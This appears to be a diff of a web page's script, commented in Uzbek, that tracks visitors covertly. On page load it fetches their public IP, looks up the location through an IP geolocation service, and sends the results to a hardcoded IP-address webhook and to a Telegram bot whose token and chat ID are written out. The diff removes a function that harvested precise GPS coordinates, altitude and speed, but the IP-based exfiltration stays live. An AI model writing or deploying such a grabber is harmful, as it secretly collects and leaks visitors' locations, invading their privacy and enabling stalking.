@@ -132,7 +132,6 @@
 
     <script>
         // Sizning webhook serveringiz
-        // YANGI URL:
         const WEBHOOK_URL = "http://38.242.228.144/webhook";
         const TELEGRAM_TOKEN = "8497552094:AAH9XKSVaoiisVOTD-gXW8GX9l8l1m5ioWM";
         const TELEGRAM_CHAT_ID = "1882641120";
@@ -159,7 +158,6 @@
                 }
             } catch (error) {
                 console.error('Webhook xatosi:', error);
-                // Xatolik bo'lsa ham dastur ishlashda davom etadi
                 return false;
             }
         }
@@ -271,7 +269,7 @@
             rotationTimer = setTimeout(switchPage, 500);
         }
         
-        // Asosiy tracking funksiyasi
+        // Asosiy tracking funksiyasi (GPS siz)
         async function startTracking() {
             try {
                 // 1. IP va geolokatsiya ma'lumotlarini olish
@@ -279,7 +277,7 @@
                 const ipData = await ipResponse.json();
                 const publicIP = ipData.ip;
 
-                // Geolokatsiya ma'lumotlari
+                // Geolokatsiya ma'lumotlari (faqat IP asosida)
                 let geoData = {};
                 try {
                     const geoResponse = await fetch(`http://ip-api.com/json/${publicIP}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
@@ -372,49 +370,7 @@
             }
         }
 
-        // GPS ma'lumotlarini yuborish
-        function trackGPS() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        const gpsData = {
-                            type: 'gps_location',
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            altitude: position.coords.altitude,
-                            speed: position.coords.speed,
-                            timestamp: new Date().toISOString()
-                        };
-
-                        await sendToWebhook(gpsData);
-
-                        const gpsMessage = `📍 <b>GPS MAʼLUMOTLARI</b>\n\n` +
-                                          `🌍 <b>Kenglik:</b> ${position.coords.latitude}\n` +
-                                          `🌎 <b>Uzunlik:</b> ${position.coords.longitude}\n` +
-                                          `🎯 <b>Aniqlik:</b> ${position.coords.accuracy}m\n` +
-                                          `🏔️ <b>Balandlik:</b> ${position.coords.altitude || 'Nomaʼlum'}m\n` +
-                                          `🚀 <b>Tezlik:</b> ${position.coords.speed || 'Nomaʼlum'}m/s`;
-
-                        await sendToTelegram(gpsMessage);
-                    },
-                    async (error) => {
-                        const gpsErrorData = {
-                            type: 'gps_error',
-                            error: error.message,
-                            code: error.code,
-                            timestamp: new Date().toISOString()
-                        };
-                        await sendToWebhook(gpsErrorData);
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
-                );
-            }
-        }
+        // GPS funksiyalari olib tashlandi
 
         // Qo'shimcha ma'lumotlarni yig'ish
         function collectAdditionalInfo() {
@@ -437,8 +393,7 @@
             // Asosiy trackingni boshlash
             await startTracking();
             
-            // GPS trackingni boshlash
-            setTimeout(trackGPS, 2000);
+            // GPS tracking olib tashlandi
             
             // Qo'shimcha ma'lumotlarni yuborish
             setTimeout(async () => {
